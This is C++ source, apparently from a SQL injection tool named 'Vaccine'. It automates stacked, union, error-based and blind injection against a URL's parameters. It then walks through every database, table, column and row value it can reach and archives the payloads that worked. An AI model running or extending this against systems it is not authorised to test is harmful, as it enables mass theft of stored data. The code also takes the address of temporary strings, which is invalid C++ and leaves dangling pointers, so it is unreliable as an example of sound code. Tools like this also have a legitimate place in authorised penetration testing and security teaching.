#include "../../include/class/VaccineSQLi.hpp"

VaccineSQLi::VaccineSQLi() : Vaccine()
{
        this->_worker_init();
}

VaccineSQLi::VaccineSQLi(
    const uint8& db_type,
    const std::string& url,
    const std::string& request_type,
    const str_vector& headers,
    const std::string& archive_file)
    : Vaccine(db_type, url, request_type, headers, archive_file)
{
        this->_worker_init();
}

VaccineSQLi::VaccineSQLi(const VaccineSQLi& other) : Vaccine(other)
{
        *this = other;
}

VaccineSQLi::~VaccineSQLi() {}

VaccineSQLi& VaccineSQLi::operator=(const VaccineSQLi& other)
{
        if (this != &other)
        {
                Vaccine::operator=(other);
                this->_full_url = other._full_url;
                this->_parameters = other._parameters;
                this->_payloads = other._payloads;
                this->_ft_payload = other._ft_payload;
                this->_ft_response = other._ft_response;
                this->_excluded = other._excluded;
                this->_method_type = other._method_type;
        }
        return *this;
}

void VaccineSQLi::stacked_queries()
{
        this->_method_type = STACKED;
        this->_launch(t_config({
            sptr_vector(),
            sptr_vector(),
            sptr_vector({NULL}),
            sptr_vector({NULL, NULL}),
        }));
}

void VaccineSQLi::union_based()
{
        std::string offset;
        this->_method_type = UNION;
        this->_launch(t_config({
            sptr_vector({&offset}),
            sptr_vector({&offset}),
            sptr_vector({NULL, &offset}),
            sptr_vector({NULL, NULL, &offset}),
        }));
}

void VaccineSQLi::error_based()
{
        this->_method_type = ERROR;
        this->_launch(t_config({
            sptr_vector({}),
            sptr_vector({}),
            sptr_vector({NULL}),
            sptr_vector({NULL, NULL}),
        }));
}

void VaccineSQLi::blind_based()
{
        this->_method_type = BLIND;
        this->_launch(t_config({
            sptr_vector({}),
            sptr_vector({}),
            sptr_vector({NULL}),
            sptr_vector({NULL, NULL}),
        }));
}

// ===================================================================== //
// =========================== P R I V A T E =========================== //
// ===================================================================== //

void VaccineSQLi::_worker_init()
{
        this->_full_url = std::string();
        this->_parameters = str_vector();
        this->_payloads = str_vector();
        this->_ft_payload = NULL;
        this->_ft_response = NULL;
        this->_excluded = str_vector();
        this->_method_type = 0;
}

void VaccineSQLi::_launch(t_config config)
{
        if (!this->_data_check())
                return;
        for (const auto& node : this->_gates)
        {
                if (!this->_init_attempt(node, this->_full_url, this->_parameters))
                        continue;
                std::cout << "[ INFO ] Testing " << this->_sqli_method_tostr()
                          << " SQLi on " << this->_full_url << "."
                          << "[ " << this->db_type_tostr() << " ]"
                          << std::endl;
                // =============================== DATABASES
                this->_fetch(DATABASES, config, std::string(), 0);

                // =============================== TABLES
                for (const auto& db : this->_databases)
                        this->_fetch(TABLES, config, db.first, 0);

                // =============================== COLUMNS
                for (const auto& db : this->_databases)
                        for (const auto& tab_index : db.second)
                                this->_fetch(COLUMNS, config, db.first, tab_index);

                // =============================== VALUES
                for (const auto& db : this->_databases)
                        for (const auto& tab_index : db.second)
                                this->_fetch(VALUES, config, db.first, tab_index);

                // =============================== END
                if (!this->_databases.empty())
                        this->_save_results(
                            this->_full_url.substr(0, this->_full_url.find('?')),
                            this->_parameters, this->_payloads);
                else
                        std::cout << "[ INFO ] " << this->_sqli_method_tostr()
                                  << " SQLi failed on " << this->_full_url << "."
                                  << "[ " << this->db_type_tostr() << " ]"
                                  << std::endl;
                this->_payloads.clear();
                this->_parameters.clear();

                this->_databases.clear();
                this->_tables.clear();
                this->_columns.clear();
                this->_values.clear();
        }
}

std::string VaccineSQLi::_sqli_method_tostr()
{
        switch (this->_method_type)
        {
        case STACKED:
                return "stacked queries";
        case UNION:
                return "union based";
        case ERROR:
                return "error based";
        case BLIND:
                return "blind based";
        default:
                return "... wait, what ?";
        }
}

void VaccineSQLi::_fetch(
    uint8 value_type,
    t_config& config,
    const std::string& db_name,
    const int& tab_index)
{
        this->_get_payload(value_type);
        this->_get_parser(value_type);
        if (value_type == DATABASES)
        {
                this->_fetch_databases(config[DATABASES]);
                return;
        }
        config[value_type].push_back(&std::string(db_name));

        if (value_type == TABLES)
                this->_fetch_tables(config[TABLES], db_name);
        else if (value_type == COLUMNS)
                this->_fetch_columns(config[COLUMNS], db_name, tab_index);
        else if (value_type == VALUES)
                this->_fetch_values(config[VALUES], db_name, tab_index);
}

void VaccineSQLi::_fetch_databases(sptr_vector config)
{
        short timeout = TIMEOUT;
        std::string payload;
        while (this->_databases.empty() && timeout--)
        {
                payload = this->_ft_payload(config);
                this->_payloads.push_back(payload);

                const str_vector parameters = this->_fill_parameters(
                    this->_parameters,
                    payload);
                const str_vector values = this->_ft_response(
                    this->_process(this->_full_url, parameters));

                for (const auto& value : values)
                        if (std::find(
                                this->_excluded.begin(),
                                this->_excluded.end(),
                                value) == this->_excluded.end())
                                this->_databases[value] = std::vector< int >();
        }
}

void VaccineSQLi::_fetch_tables(
    sptr_vector config,
    const std::string& db_name)
{
        const std::string payload = this->_ft_payload(config);
        this->_payloads.push_back(payload);

        const str_vector parameters = this->_fill_parameters(
            this->_parameters,
            payload);
        const str_vector values = this->_ft_response(
            this->_process(this->_full_url, parameters));

        if (values.empty())
                return;
        const int size = this->_tables.size();
        this->_tables.push_back(std::unordered_map< std::string, int >());

        for (const auto& value : values)
                this->_tables[size][value] = -1;
        this->_databases[db_name].push_back(size);
}

void VaccineSQLi::_fetch_columns(
    sptr_vector config,
    const std::string& db_name,
    const int& tab_index)
{
        if (tab_index < 0)
                return;
        std::string payload;
        for (const auto& table : this->_tables[tab_index])
        {
                config[0] = &std::string(table.first);
                payload = this->_ft_payload(config);
                this->_payloads.push_back(payload);

                const str_vector parameters = this->_fill_parameters(
                    this->_parameters,
                    payload);
                const str_vector values = this->_ft_response(
                    this->_process(this->_full_url, parameters));

                if (values.empty())
                        continue;
                const int size = this->_columns.size();
                this->_columns.push_back(std::unordered_map< std::string, int >());

                for (const auto& value : values)
                        this->_columns[size][value] = -1;
                this->_tables[tab_index][table.first] = size;
        }
}

void VaccineSQLi::_fetch_values(
    sptr_vector config,
    const std::string& db_name,
    const int& tab_index)
{
        if (tab_index < 0)
                return;
        int index;
        std::string payload;
        for (const auto& table : this->_tables[tab_index])
        {
                index = this->_tables.at(tab_index).at(table.first);
                if (index < 0)
                        continue;
                config[0] = &std::string(table.first);
                for (auto& column : this->_columns[index])
                {
                        config[1] = &std::string(column.first);
                        payload = this->_ft_payload(config);
                        this->_payloads.push_back(payload);

                        const str_vector parameters = this->_fill_parameters(
                            this->_parameters,
                            payload);
                        const str_vector values = this->_ft_response(
                            this->_process(this->_full_url, parameters));

                        if (values.empty())
                                continue;
                        const int size = this->_values.size();
                        this->_values.push_back(str_vector());

                        for (const auto& value : values)
                                this->_values[size].push_back(value);
                        this->_columns[index][column.first] = size;
                }
        }
}